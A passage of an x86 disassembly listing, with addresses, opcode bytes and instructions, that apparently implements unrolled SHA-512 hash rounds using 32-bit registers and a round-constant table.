  404129:	31 4c 24 14          	xor    %ecx,0x14(%esp)
  40412d:	8b 4c 24 40          	mov    0x40(%esp),%ecx
  404131:	c1 e8 0e             	shr    $0xe,%eax
  404134:	c1 e1 12             	shl    $0x12,%ecx
  404137:	0b c8                	or     %eax,%ecx
  404139:	8b 44 24 28          	mov    0x28(%esp),%eax
  40413d:	31 4c 24 14          	xor    %ecx,0x14(%esp)
  404141:	23 44 24 18          	and    0x18(%esp),%eax
  404145:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  404149:	f7 d1                	not    %ecx
  40414b:	23 4c 24 4c          	and    0x4c(%esp),%ecx
  40414f:	33 c8                	xor    %eax,%ecx
  404151:	8b 84 24 04 01 00 00 	mov    0x104(%esp),%eax
  404158:	01 4c 24 14          	add    %ecx,0x14(%esp)
  40415c:	39 44 24 6c          	cmp    %eax,0x6c(%esp)
  404160:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  404164:	1b c0                	sbb    %eax,%eax
  404166:	f7 d8                	neg    %eax
  404168:	03 c8                	add    %eax,%ecx
  40416a:	3b 54 24 5c          	cmp    0x5c(%esp),%edx
  40416e:	8b 54 24 38          	mov    0x38(%esp),%edx
  404172:	1b c0                	sbb    %eax,%eax
  404174:	f7 d8                	neg    %eax
  404176:	03 c8                	add    %eax,%ecx
  404178:	3b f7                	cmp    %edi,%esi
  40417a:	8b 74 24 2c          	mov    0x2c(%esp),%esi
  40417e:	8b fa                	mov    %edx,%edi
  404180:	1b c0                	sbb    %eax,%eax
  404182:	f7 d8                	neg    %eax
  404184:	03 c8                	add    %eax,%ecx
  404186:	3b dd                	cmp    %ebp,%ebx
  404188:	8b 5c 24 3c          	mov    0x3c(%esp),%ebx
  40418c:	1b c0                	sbb    %eax,%eax
  40418e:	33 74 24 58          	xor    0x58(%esp),%esi
  404192:	f7 d8                	neg    %eax
  404194:	c1 e7 04             	shl    $0x4,%edi
  404197:	03 c8                	add    %eax,%ecx
  404199:	23 f3                	and    %ebx,%esi
  40419b:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  40419f:	33 74 24 74          	xor    0x74(%esp),%esi
  4041a3:	03 88 b0 f2 41 00    	add    0x41f2b0(%eax),%ecx
  4041a9:	03 8c 04 48 01 00 00 	add    0x148(%esp,%eax,1),%ecx
  4041b0:	8b c3                	mov    %ebx,%eax
  4041b2:	03 8c 24 08 01 00 00 	add    0x108(%esp),%ecx
  4041b9:	c1 e8 1c             	shr    $0x1c,%eax
  4041bc:	0b f8                	or     %eax,%edi
  4041be:	89 4c 24 14          	mov    %ecx,0x14(%esp)
  4041c2:	8b c3                	mov    %ebx,%eax
  4041c4:	8b ca                	mov    %edx,%ecx
  4041c6:	c1 e0 1e             	shl    $0x1e,%eax
  4041c9:	c1 e9 02             	shr    $0x2,%ecx
  4041cc:	0b c8                	or     %eax,%ecx
  4041ce:	8b c3                	mov    %ebx,%eax
  4041d0:	8b 5c 24 6c          	mov    0x6c(%esp),%ebx
  4041d4:	33 f9                	xor    %ecx,%edi
  4041d6:	c1 e0 19             	shl    $0x19,%eax
  4041d9:	8b ca                	mov    %edx,%ecx
  4041db:	c1 e9 07             	shr    $0x7,%ecx
  4041de:	0b c8                	or     %eax,%ecx
  4041e0:	33 f9                	xor    %ecx,%edi
  4041e2:	8b 4c 24 34          	mov    0x34(%esp),%ecx
  4041e6:	03 f7                	add    %edi,%esi
  4041e8:	8d 04 0b             	lea    (%ebx,%ecx,1),%eax
  4041eb:	3b c1                	cmp    %ecx,%eax
  4041ed:	89 44 24 54          	mov    %eax,0x54(%esp)
  4041f1:	1b c0                	sbb    %eax,%eax
  4041f3:	f7 d8                	neg    %eax
  4041f5:	03 84 24 0c 01 00 00 	add    0x10c(%esp),%eax
  4041fc:	03 44 24 14          	add    0x14(%esp),%eax
  404200:	89 44 24 20          	mov    %eax,0x20(%esp)
  404204:	8d 04 33             	lea    (%ebx,%esi,1),%eax
  404207:	8b 4c 24 38          	mov    0x38(%esp),%ecx
  40420b:	89 44 24 24          	mov    %eax,0x24(%esp)
  40420f:	8b 44 24 3c          	mov    0x3c(%esp),%eax
  404213:	c1 e8 07             	shr    $0x7,%eax
  404216:	c1 e1 1e             	shl    $0x1e,%ecx
  404219:	c1 e2 19             	shl    $0x19,%edx
  40421c:	0b d0                	or     %eax,%edx
  40421e:	8b 6c 24 54          	mov    0x54(%esp),%ebp
  404222:	8b 44 24 3c          	mov    0x3c(%esp),%eax
  404226:	c1 e8 02             	shr    $0x2,%eax
  404229:	0b c8                	or     %eax,%ecx
  40422b:	8b 44 24 3c          	mov    0x3c(%esp),%eax
  40422f:	33 d1                	xor    %ecx,%edx
  404231:	c1 e0 04             	shl    $0x4,%eax
  404234:	8b 4c 24 38          	mov    0x38(%esp),%ecx
  404238:	c1 e9 1c             	shr    $0x1c,%ecx
  40423b:	0b c8                	or     %eax,%ecx
  40423d:	8b 44 24 44          	mov    0x44(%esp),%eax
  404241:	33 d1                	xor    %ecx,%edx
  404243:	8b 4c 24 48          	mov    0x48(%esp),%ecx
  404247:	33 c8                	xor    %eax,%ecx
  404249:	23 44 24 48          	and    0x48(%esp),%eax
  40424d:	23 4c 24 38          	and    0x38(%esp),%ecx
  404251:	33 c8                	xor    %eax,%ecx
  404253:	8d 04 33             	lea    (%ebx,%esi,1),%eax
  404256:	03 d1                	add    %ecx,%edx
  404258:	3b c3                	cmp    %ebx,%eax
  40425a:	8b 5c 24 40          	mov    0x40(%esp),%ebx
  40425e:	1b c0                	sbb    %eax,%eax
  404260:	f7 d8                	neg    %eax
  404262:	03 44 24 14          	add    0x14(%esp),%eax
  404266:	3b f7                	cmp    %edi,%esi
  404268:	8b 74 24 20          	mov    0x20(%esp),%esi
  40426c:	1b c9                	sbb    %ecx,%ecx
  40426e:	03 c2                	add    %edx,%eax
  404270:	f7 d9                	neg    %ecx
  404272:	23 dd                	and    %ebp,%ebx
  404274:	03 c8                	add    %eax,%ecx
  404276:	8b d6                	mov    %esi,%edx
  404278:	8b c5                	mov    %ebp,%eax
  40427a:	89 4c 24 34          	mov    %ecx,0x34(%esp)
  40427e:	f7 d0                	not    %eax
  404280:	c1 ea 09             	shr    $0x9,%edx
  404283:	23 44 24 50          	and    0x50(%esp),%eax
  404287:	8b ce                	mov    %esi,%ecx
  404289:	33 d8                	xor    %eax,%ebx
  40428b:	c1 e1 0e             	shl    $0xe,%ecx
  40428e:	8b c5                	mov    %ebp,%eax
  404290:	89 5c 24 5c          	mov    %ebx,0x5c(%esp)
  404294:	c1 e0 17             	shl    $0x17,%eax
  404297:	0b d0                	or     %eax,%edx
  404299:	8b c5                	mov    %ebp,%eax
  40429b:	c1 e8 12             	shr    $0x12,%eax
  40429e:	0b c8                	or     %eax,%ecx
  4042a0:	c1 ed 0e             	shr    $0xe,%ebp
  4042a3:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  4042a7:	33 d1                	xor    %ecx,%edx
  4042a9:	8b ce                	mov    %esi,%ecx
  4042ab:	c1 e1 12             	shl    $0x12,%ecx
  4042ae:	0b e9                	or     %ecx,%ebp
  4042b0:	8b 4c 24 20          	mov    0x20(%esp),%ecx
  4042b4:	8b b4 04 54 01 00 00 	mov    0x154(%esp,%eax,1),%esi
  4042bb:	33 ea                	xor    %edx,%ebp
  4042bd:	03 eb                	add    %ebx,%ebp
  4042bf:	c1 e9 0e             	shr    $0xe,%ecx
  4042c2:	8b 98 bc f2 41 00    	mov    0x41f2bc(%eax),%ebx
  4042c8:	8b 44 24 54          	mov    0x54(%esp),%eax
  4042cc:	c1 e0 12             	shl    $0x12,%eax
  4042cf:	0b c8                	or     %eax,%ecx
  4042d1:	8b 44 24 54          	mov    0x54(%esp),%eax
  4042d5:	89 4c 24 10          	mov    %ecx,0x10(%esp)
  4042d9:	8d 3c 2b             	lea    (%ebx,%ebp,1),%edi
  4042dc:	8b 4c 24 20          	mov    0x20(%esp),%ecx
  4042e0:	8d 14 3e             	lea    (%esi,%edi,1),%edx
  4042e3:	c1 e9 12             	shr    $0x12,%ecx
  4042e6:	c1 e0 0e             	shl    $0xe,%eax
  4042e9:	0b c8                	or     %eax,%ecx
  4042eb:	8b 44 24 54          	mov    0x54(%esp),%eax
  4042ef:	31 4c 24 10          	xor    %ecx,0x10(%esp)
  4042f3:	8b 4c 24 20          	mov    0x20(%esp),%ecx
  4042f7:	c1 e1 17             	shl    $0x17,%ecx
  4042fa:	c1 e8 09             	shr    $0x9,%eax
  4042fd:	0b c8                	or     %eax,%ecx
  4042ff:	c7 44 24 60 00 00 00 	movl   $0x0,0x60(%esp)
  404306:	00 
  404307:	31 4c 24 10          	xor    %ecx,0x10(%esp)
  40430b:	8b 4c 24 20          	mov    0x20(%esp),%ecx
  40430f:	8b 44 24 18          	mov    0x18(%esp),%eax
  404313:	f7 d1                	not    %ecx
  404315:	23 44 24 20          	and    0x20(%esp),%eax
  404319:	23 4c 24 28          	and    0x28(%esp),%ecx
  40431d:	33 c8                	xor    %eax,%ecx
  40431f:	01 4c 24 10          	add    %ecx,0x10(%esp)
  404323:	8b 4c 24 30          	mov    0x30(%esp),%ecx
  404327:	8d 04 0a             	lea    (%edx,%ecx,1),%eax
  40432a:	3b c1                	cmp    %ecx,%eax
  40432c:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  404330:	1b c0                	sbb    %eax,%eax
  404332:	f7 d8                	neg    %eax
  404334:	03 c8                	add    %eax,%ecx
  404336:	3b d6                	cmp    %esi,%edx
  404338:	8b 74 24 24          	mov    0x24(%esp),%esi
  40433c:	1b c0                	sbb    %eax,%eax
  40433e:	f7 d8                	neg    %eax
  404340:	03 c8                	add    %eax,%ecx
  404342:	3b fb                	cmp    %ebx,%edi
  404344:	8b 5c 24 34          	mov    0x34(%esp),%ebx
  404348:	8b fb                	mov    %ebx,%edi
  40434a:	1b c0                	sbb    %eax,%eax
  40434c:	f7 d8                	neg    %eax
  40434e:	03 c8                	add    %eax,%ecx
  404350:	3b 6c 24 5c          	cmp    0x5c(%esp),%ebp
  404354:	1b c0                	sbb    %eax,%eax
  404356:	c1 e7 04             	shl    $0x4,%edi
  404359:	f7 d8                	neg    %eax
  40435b:	03 c8                	add    %eax,%ecx
  40435d:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  404361:	03 88 b8 f2 41 00    	add    0x41f2b8(%eax),%ecx
  404367:	03 8c 04 50 01 00 00 	add    0x150(%esp,%eax,1),%ecx
  40436e:	8b c6                	mov    %esi,%eax
  404370:	03 4c 24 4c          	add    0x4c(%esp),%ecx
  404374:	c1 e8 1c             	shr    $0x1c,%eax
  404377:	0b f8                	or     %eax,%edi
  404379:	89 4c 24 10          	mov    %ecx,0x10(%esp)
  40437d:	8b c6                	mov    %esi,%eax
  40437f:	8b cb                	mov    %ebx,%ecx
  404381:	c1 e0 1e             	shl    $0x1e,%eax
  404384:	c1 e9 02             	shr    $0x2,%ecx
  404387:	0b c8                	or     %eax,%ecx
  404389:	8b c6                	mov    %esi,%eax
  40438b:	33 f9                	xor    %ecx,%edi
  40438d:	c1 e0 19             	shl    $0x19,%eax
  404390:	8b cb                	mov    %ebx,%ecx
  404392:	8b 5c 24 30          	mov    0x30(%esp),%ebx
  404396:	c1 e9 07             	shr    $0x7,%ecx
  404399:	03 da                	add    %edx,%ebx
  40439b:	0b c8                	or     %eax,%ecx
  40439d:	8b 44 24 3c          	mov    0x3c(%esp),%eax
  4043a1:	33 f9                	xor    %ecx,%edi
  4043a3:	8b c8                	mov    %eax,%ecx
  4043a5:	23 44 24 58          	and    0x58(%esp),%eax
  4043a9:	33 4c 24 58          	xor    0x58(%esp),%ecx
  4043ad:	23 f1                	and    %ecx,%esi
  4043af:	8b 4c 24 2c          	mov    0x2c(%esp),%ecx
  4043b3:	33 f0                	xor    %eax,%esi
  4043b5:	03 f7                	add    %edi,%esi
  4043b7:	8d 04 19             	lea    (%ecx,%ebx,1),%eax
  4043ba:	3b c1                	cmp    %ecx,%eax
  4043bc:	89 44 24 14          	mov    %eax,0x14(%esp)
  4043c0:	8b 4c 24 34          	mov    0x34(%esp),%ecx
  4043c4:	8b d1                	mov    %ecx,%edx
  4043c6:	1b c0                	sbb    %eax,%eax
  4043c8:	c1 e2 19             	shl    $0x19,%edx
  4043cb:	f7 d8                	neg    %eax
  4043cd:	03 44 24 10          	add    0x10(%esp),%eax
  4043d1:	03 44 24 48          	add    0x48(%esp),%eax
  4043d5:	89 44 24 30          	mov    %eax,0x30(%esp)
  4043d9:	8d 04 33             	lea    (%ebx,%esi,1),%eax
  4043dc:	89 44 24 48          	mov    %eax,0x48(%esp)
  4043e0:	8b 44 24 24          	mov    0x24(%esp),%eax
  4043e4:	c1 e8 07             	shr    $0x7,%eax
  4043e7:	0b d0                	or     %eax,%edx
  4043e9:	c1 e1 1e             	shl    $0x1e,%ecx
  4043ec:	8b 44 24 24          	mov    0x24(%esp),%eax
  4043f0:	c1 e8 02             	shr    $0x2,%eax
  4043f3:	0b c8                	or     %eax,%ecx
  4043f5:	8b 6c 24 14          	mov    0x14(%esp),%ebp
  4043f9:	33 d1                	xor    %ecx,%edx
  4043fb:	8b 44 24 24          	mov    0x24(%esp),%eax
  4043ff:	8b 4c 24 34          	mov    0x34(%esp),%ecx
  404403:	c1 e9 1c             	shr    $0x1c,%ecx
  404406:	c1 e0 04             	shl    $0x4,%eax
  404409:	0b c8                	or     %eax,%ecx
  40440b:	8b 44 24 38          	mov    0x38(%esp),%eax
  40440f:	33 d1                	xor    %ecx,%edx
  404411:	8b c8                	mov    %eax,%ecx
  404413:	33 4c 24 44          	xor    0x44(%esp),%ecx
  404417:	23 44 24 44          	and    0x44(%esp),%eax
  40441b:	23 4c 24 34          	and    0x34(%esp),%ecx
  40441f:	33 c8                	xor    %eax,%ecx
  404421:	8d 04 33             	lea    (%ebx,%esi,1),%eax
  404424:	03 d1                	add    %ecx,%edx
  404426:	3b c3                	cmp    %ebx,%eax
  404428:	8b 5c 24 54          	mov    0x54(%esp),%ebx
  40442c:	1b c0                	sbb    %eax,%eax
  40442e:	f7 d8                	neg    %eax
  404430:	03 44 24 10          	add    0x10(%esp),%eax
  404434:	3b f7                	cmp    %edi,%esi
  404436:	8b 74 24 30          	mov    0x30(%esp),%esi
  40443a:	1b c9                	sbb    %ecx,%ecx
  40443c:	03 c2                	add    %edx,%eax
  40443e:	f7 d9                	neg    %ecx
  404440:	23 dd                	and    %ebp,%ebx
  404442:	03 c8                	add    %eax,%ecx
  404444:	8b d6                	mov    %esi,%edx
  404446:	89 4c 24 4c          	mov    %ecx,0x4c(%esp)
  40444a:	8b c5                	mov    %ebp,%eax
  40444c:	f7 d0                	not    %eax
  40444e:	c1 e2 12             	shl    $0x12,%edx
  404451:	23 44 24 40          	and    0x40(%esp),%eax
  404455:	8b ce                	mov    %esi,%ecx
  404457:	33 d8                	xor    %eax,%ebx
  404459:	c1 e9 09             	shr    $0x9,%ecx
  40445c:	8b c5                	mov    %ebp,%eax
  40445e:	89 5c 24 5c          	mov    %ebx,0x5c(%esp)
  404462:	c1 e8 0e             	shr    $0xe,%eax
  404465:	0b d0                	or     %eax,%edx
  404467:	8b c5                	mov    %ebp,%eax
  404469:	c1 e0 17             	shl    $0x17,%eax
  40446c:	0b c8                	or     %eax,%ecx
  40446e:	c1 ed 12             	shr    $0x12,%ebp
  404471:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  404475:	33 d1                	xor    %ecx,%edx
  404477:	8b ce                	mov    %esi,%ecx
  404479:	c1 e1 0e             	shl    $0xe,%ecx
  40447c:	0b e9                	or     %ecx,%ebp
  40447e:	8b 4c 24 30          	mov    0x30(%esp),%ecx
  404482:	8b b4 04 5c 01 00 00 	mov    0x15c(%esp,%eax,1),%esi
  404489:	33 ea                	xor    %edx,%ebp
  40448b:	c1 e9 0e             	shr    $0xe,%ecx
  40448e:	03 eb                	add    %ebx,%ebp
  404490:	8b 98 c4 f2 41 00    	mov    0x41f2c4(%eax),%ebx
  404496:	8b 44 24 14          	mov    0x14(%esp),%eax
  40449a:	c1 e0 12             	shl    $0x12,%eax
  40449d:	0b c8                	or     %eax,%ecx
  40449f:	8b 44 24 14          	mov    0x14(%esp),%eax
  4044a3:	89 4c 24 10          	mov    %ecx,0x10(%esp)
  4044a7:	8d 3c 2b             	lea    (%ebx,%ebp,1),%edi
  4044aa:	8b 4c 24 30          	mov    0x30(%esp),%ecx
  4044ae:	8d 14 3e             	lea    (%esi,%edi,1),%edx
  4044b1:	c1 e9 12             	shr    $0x12,%ecx
  4044b4:	c1 e0 0e             	shl    $0xe,%eax
  4044b7:	0b c8                	or     %eax,%ecx
  4044b9:	8b 44 24 14          	mov    0x14(%esp),%eax
  4044bd:	31 4c 24 10          	xor    %ecx,0x10(%esp)
  4044c1:	8b 4c 24 30          	mov    0x30(%esp),%ecx
  4044c5:	c1 e1 17             	shl    $0x17,%ecx
  4044c8:	c1 e8 09             	shr    $0x9,%eax
  4044cb:	0b c8                	or     %eax,%ecx
  4044cd:	8b 44 24 20          	mov    0x20(%esp),%eax
  4044d1:	31 4c 24 10          	xor    %ecx,0x10(%esp)
  4044d5:	8b 4c 24 30          	mov    0x30(%esp),%ecx
  4044d9:	f7 d1                	not    %ecx
  4044db:	23 4c 24 18          	and    0x18(%esp),%ecx
  4044df:	23 44 24 30          	and    0x30(%esp),%eax
  4044e3:	33 c8                	xor    %eax,%ecx
  4044e5:	c7 44 24 60 00 00 00 	movl   $0x0,0x60(%esp)
  4044ec:	00 
  4044ed:	01 4c 24 10          	add    %ecx,0x10(%esp)
  4044f1:	3b d6                	cmp    %esi,%edx
  4044f3:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  4044f7:	1b c0                	sbb    %eax,%eax
  4044f9:	8b 74 24 48          	mov    0x48(%esp),%esi
  4044fd:	f7 d8                	neg    %eax
  4044ff:	03 c8                	add    %eax,%ecx
  404501:	3b fb                	cmp    %ebx,%edi
  404503:	1b c0                	sbb    %eax,%eax
  404505:	f7 d8                	neg    %eax
  404507:	03 c8                	add    %eax,%ecx
  404509:	3b 6c 24 5c          	cmp    0x5c(%esp),%ebp
  40450d:	1b c0                	sbb    %eax,%eax
  40450f:	f7 d8                	neg    %eax
  404511:	03 c8                	add    %eax,%ecx
  404513:	8b 44 24 50          	mov    0x50(%esp),%eax
  404517:	8d 1c 02             	lea    (%edx,%eax,1),%ebx
  40451a:	8b 54 24 4c          	mov    0x4c(%esp),%edx
  40451e:	3b d8                	cmp    %eax,%ebx
  404520:	8b fa                	mov    %edx,%edi
  404522:	1b c0                	sbb    %eax,%eax
  404524:	c1 e7 04             	shl    $0x4,%edi
  404527:	f7 d8                	neg    %eax
  404529:	03 c8                	add    %eax,%ecx
  40452b:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  40452f:	03 88 c0 f2 41 00    	add    0x41f2c0(%eax),%ecx
  404535:	03 8c 04 58 01 00 00 	add    0x158(%esp,%eax,1),%ecx
  40453c:	8b c6                	mov    %esi,%eax
  40453e:	03 4c 24 28          	add    0x28(%esp),%ecx
  404542:	c1 e8 1c             	shr    $0x1c,%eax
  404545:	0b f8                	or     %eax,%edi
  404547:	89 4c 24 10          	mov    %ecx,0x10(%esp)
  40454b:	8b ca                	mov    %edx,%ecx
  40454d:	8b c6                	mov    %esi,%eax
  40454f:	c1 e0 1e             	shl    $0x1e,%eax
  404552:	c1 e9 02             	shr    $0x2,%ecx
  404555:	0b c8                	or     %eax,%ecx
  404557:	8b c6                	mov    %esi,%eax
  404559:	33 f9                	xor    %ecx,%edi
  40455b:	c1 e0 19             	shl    $0x19,%eax
  40455e:	8b ca                	mov    %edx,%ecx
  404560:	c1 e9 07             	shr    $0x7,%ecx
  404563:	0b c8                	or     %eax,%ecx
  404565:	8b 44 24 3c          	mov    0x3c(%esp),%eax
  404569:	33 f9                	xor    %ecx,%edi
  40456b:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  40456f:	33 c8                	xor    %eax,%ecx
  404571:	23 44 24 24          	and    0x24(%esp),%eax
  404575:	23 f1                	and    %ecx,%esi
  404577:	33 f0                	xor    %eax,%esi
  404579:	8b 44 24 58          	mov    0x58(%esp),%eax
  40457d:	03 f7                	add    %edi,%esi
  40457f:	8d 0c 03             	lea    (%ebx,%eax,1),%ecx
  404582:	3b c8                	cmp    %eax,%ecx
  404584:	89 4c 24 50          	mov    %ecx,0x50(%esp)
  404588:	8b ca                	mov    %edx,%ecx
  40458a:	1b c0                	sbb    %eax,%eax
  40458c:	c1 e2 19             	shl    $0x19,%edx
  40458f:	f7 d8                	neg    %eax
  404591:	c1 e1 1e             	shl    $0x1e,%ecx
  404594:	03 44 24 10          	add    0x10(%esp),%eax
  404598:	03 44 24 44          	add    0x44(%esp),%eax
  40459c:	89 44 24 2c          	mov    %eax,0x2c(%esp)
  4045a0:	8d 04 1e             	lea    (%esi,%ebx,1),%eax
  4045a3:	89 44 24 44          	mov    %eax,0x44(%esp)
  4045a7:	8b 44 24 48          	mov    0x48(%esp),%eax
  4045ab:	c1 e8 07             	shr    $0x7,%eax
  4045ae:	0b d0                	or     %eax,%edx
  4045b0:	8b 44 24 48          	mov    0x48(%esp),%eax
  4045b4:	c1 e8 02             	shr    $0x2,%eax
  4045b7:	0b c8                	or     %eax,%ecx
  4045b9:	8b 44 24 48          	mov    0x48(%esp),%eax
  4045bd:	33 d1                	xor    %ecx,%edx
  4045bf:	c1 e0 04             	shl    $0x4,%eax
  4045c2:	8b 4c 24 4c          	mov    0x4c(%esp),%ecx
  4045c6:	c1 e9 1c             	shr    $0x1c,%ecx
  4045c9:	0b c8                	or     %eax,%ecx
  4045cb:	33 d1                	xor    %ecx,%edx
  4045cd:	8b 4c 24 34          	mov    0x34(%esp),%ecx
  4045d1:	8b 44 24 38          	mov    0x38(%esp),%eax
  4045d5:	33 c8                	xor    %eax,%ecx
  4045d7:	23 44 24 34          	and    0x34(%esp),%eax
  4045db:	23 4c 24 4c          	and    0x4c(%esp),%ecx
  4045df:	33 c8                	xor    %eax,%ecx
  4045e1:	8b 6c 24 50          	mov    0x50(%esp),%ebp
  4045e5:	03 d1                	add    %ecx,%edx
  4045e7:	8d 04 1e             	lea    (%esi,%ebx,1),%eax
  4045ea:	3b c3                	cmp    %ebx,%eax
  4045ec:	8b 5c 24 14          	mov    0x14(%esp),%ebx
  4045f0:	1b c0                	sbb    %eax,%eax
  4045f2:	f7 d8                	neg    %eax
  4045f4:	03 44 24 10          	add    0x10(%esp),%eax
  4045f8:	3b f7                	cmp    %edi,%esi
  4045fa:	8b 74 24 2c          	mov    0x2c(%esp),%esi
  4045fe:	1b c9                	sbb    %ecx,%ecx
  404600:	03 c2                	add    %edx,%eax
  404602:	f7 d9                	neg    %ecx
  404604:	23 dd                	and    %ebp,%ebx
  404606:	03 c8                	add    %eax,%ecx
  404608:	8b d6                	mov    %esi,%edx
  40460a:	89 4c 24 28          	mov    %ecx,0x28(%esp)
  40460e:	8b c5                	mov    %ebp,%eax
  404610:	f7 d0                	not    %eax
  404612:	c1 ea 09             	shr    $0x9,%edx
  404615:	23 44 24 54          	and    0x54(%esp),%eax
  404619:	8b ce                	mov    %esi,%ecx
  40461b:	33 d8                	xor    %eax,%ebx
  40461d:	c1 e1 0e             	shl    $0xe,%ecx
  404620:	8b c5                	mov    %ebp,%eax
  404622:	89 5c 24 5c          	mov    %ebx,0x5c(%esp)
  404626:	c1 e0 17             	shl    $0x17,%eax
  404629:	0b d0                	or     %eax,%edx
  40462b:	8b c5                	mov    %ebp,%eax
  40462d:	c1 e8 12             	shr    $0x12,%eax
  404630:	0b c8                	or     %eax,%ecx
  404632:	c1 ed 0e             	shr    $0xe,%ebp
  404635:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  404639:	33 d1                	xor    %ecx,%edx
  40463b:	8b ce                	mov    %esi,%ecx
  40463d:	c1 e1 12             	shl    $0x12,%ecx
  404640:	0b e9                	or     %ecx,%ebp
  404642:	8b 4c 24 2c          	mov    0x2c(%esp),%ecx
  404646:	8b b4 04 64 01 00 00 	mov    0x164(%esp,%eax,1),%esi
  40464d:	33 ea                	xor    %edx,%ebp
  40464f:	c1 e9 0e             	shr    $0xe,%ecx
  404652:	03 eb                	add    %ebx,%ebp
  404654:	8b 98 cc f2 41 00    	mov    0x41f2cc(%eax),%ebx
  40465a:	8b 44 24 50          	mov    0x50(%esp),%eax
  40465e:	c1 e0 12             	shl    $0x12,%eax
  404661:	0b c8                	or     %eax,%ecx
  404663:	8b 44 24 50          	mov    0x50(%esp),%eax
  404667:	89 4c 24 10          	mov    %ecx,0x10(%esp)
  40466b:	8d 3c 2b             	lea    (%ebx,%ebp,1),%edi
  40466e:	8b 4c 24 2c          	mov    0x2c(%esp),%ecx
  404672:	8d 14 3e             	lea    (%esi,%edi,1),%edx
  404675:	c1 e9 12             	shr    $0x12,%ecx
  404678:	c1 e0 0e             	shl    $0xe,%eax
  40467b:	0b c8                	or     %eax,%ecx
  40467d:	8b 44 24 50          	mov    0x50(%esp),%eax
  404681:	31 4c 24 10          	xor    %ecx,0x10(%esp)
  404685:	8b 4c 24 2c          	mov    0x2c(%esp),%ecx
  404689:	c1 e1 17             	shl    $0x17,%ecx
  40468c:	c1 e8 09             	shr    $0x9,%eax
  40468f:	0b c8                	or     %eax,%ecx
  404691:	8b 44 24 30          	mov    0x30(%esp),%eax
  404695:	31 4c 24 10          	xor    %ecx,0x10(%esp)
  404699:	23 44 24 2c          	and    0x2c(%esp),%eax
  40469d:	8b 4c 24 2c          	mov    0x2c(%esp),%ecx
  4046a1:	f7 d1                	not    %ecx
  4046a3:	23 4c 24 20          	and    0x20(%esp),%ecx
  4046a7:	33 c8                	xor    %eax,%ecx
  4046a9:	01 4c 24 10          	add    %ecx,0x10(%esp)
  4046ad:	8b 4c 24 40          	mov    0x40(%esp),%ecx
  4046b1:	8d 04 11             	lea    (%ecx,%edx,1),%eax
  4046b4:	3b c1                	cmp    %ecx,%eax
  4046b6:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  4046ba:	1b c0                	sbb    %eax,%eax
  4046bc:	f7 d8                	neg    %eax
  4046be:	03 c8                	add    %eax,%ecx
  4046c0:	3b d6                	cmp    %esi,%edx
  4046c2:	c7 44 24 60 00 00 00 	movl   $0x0,0x60(%esp)
  4046c9:	00 
  4046ca:	8b 74 24 24          	mov    0x24(%esp),%esi
  4046ce:	1b c0                	sbb    %eax,%eax
  4046d0:	f7 d8                	neg    %eax
  4046d2:	03 c8                	add    %eax,%ecx
  4046d4:	3b fb                	cmp    %ebx,%edi
  4046d6:	8b 5c 24 28          	mov    0x28(%esp),%ebx
  4046da:	8b fb                	mov    %ebx,%edi
  4046dc:	1b c0                	sbb    %eax,%eax
  4046de:	f7 d8                	neg    %eax
  4046e0:	03 c8                	add    %eax,%ecx
  4046e2:	3b 6c 24 5c          	cmp    0x5c(%esp),%ebp
  4046e6:	8b 6c 24 44          	mov    0x44(%esp),%ebp
  4046ea:	1b c0                	sbb    %eax,%eax
  4046ec:	c1 e7 04             	shl    $0x4,%edi
  4046ef:	f7 d8                	neg    %eax
  4046f1:	03 c8                	add    %eax,%ecx
  4046f3:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  4046f7:	03 88 c8 f2 41 00    	add    0x41f2c8(%eax),%ecx
  4046fd:	03 8c 04 60 01 00 00 	add    0x160(%esp,%eax,1),%ecx
  404704:	8b c5                	mov    %ebp,%eax
  404706:	03 4c 24 18          	add    0x18(%esp),%ecx
  40470a:	c1 e8 1c             	shr    $0x1c,%eax
  40470d:	0b f8                	or     %eax,%edi
  40470f:	89 4c 24 10          	mov    %ecx,0x10(%esp)
  404713:	8b c5                	mov    %ebp,%eax
  404715:	8b cb                	mov    %ebx,%ecx
  404717:	c1 e0 1e             	shl    $0x1e,%eax
  40471a:	c1 e9 02             	shr    $0x2,%ecx
  40471d:	0b c8                	or     %eax,%ecx
  40471f:	8b c5                	mov    %ebp,%eax
  404721:	33 f9                	xor    %ecx,%edi
  404723:	c1 e0 19             	shl    $0x19,%eax
  404726:	8b cb                	mov    %ebx,%ecx
  404728:	8b 5c 24 10          	mov    0x10(%esp),%ebx
  40472c:	c1 e9 07             	shr    $0x7,%ecx
  40472f:	0b c8                	or     %eax,%ecx
  404731:	8b 44 24 48          	mov    0x48(%esp),%eax
  404735:	33 f0                	xor    %eax,%esi
  404737:	33 f9                	xor    %ecx,%edi
  404739:	23 44 24 24          	and    0x24(%esp),%eax
  40473d:	23 f5                	and    %ebp,%esi
  40473f:	8b 4c 24 3c          	mov    0x3c(%esp),%ecx
  404743:	33 f0                	xor    %eax,%esi
  404745:	8b 6c 24 40          	mov    0x40(%esp),%ebp
  404749:	03 f7                	add    %edi,%esi
  40474b:	03 ea                	add    %edx,%ebp
  40474d:	8d 04 29             	lea    (%ecx,%ebp,1),%eax
  404750:	3b c1                	cmp    %ecx,%eax
  404752:	89 44 24 58          	mov    %eax,0x58(%esp)
  404756:	8b 4c 24 28          	mov    0x28(%esp),%ecx
  40475a:	8b d1                	mov    %ecx,%edx
  40475c:	1b c0                	sbb    %eax,%eax
  40475e:	c1 e2 19             	shl    $0x19,%edx
  404761:	f7 d8                	neg    %eax
  404763:	c1 e1 1e             	shl    $0x1e,%ecx
  404766:	03 c3                	add    %ebx,%eax
  404768:	03 44 24 38          	add    0x38(%esp),%eax
  40476c:	89 44 24 10          	mov    %eax,0x10(%esp)
  404770:	8d 04 2e             	lea    (%esi,%ebp,1),%eax
  404773:	89 44 24 3c          	mov    %eax,0x3c(%esp)
  404777:	8b 44 24 44          	mov    0x44(%esp),%eax
  40477b:	c1 e8 07             	shr    $0x7,%eax
  40477e:	0b d0                	or     %eax,%edx
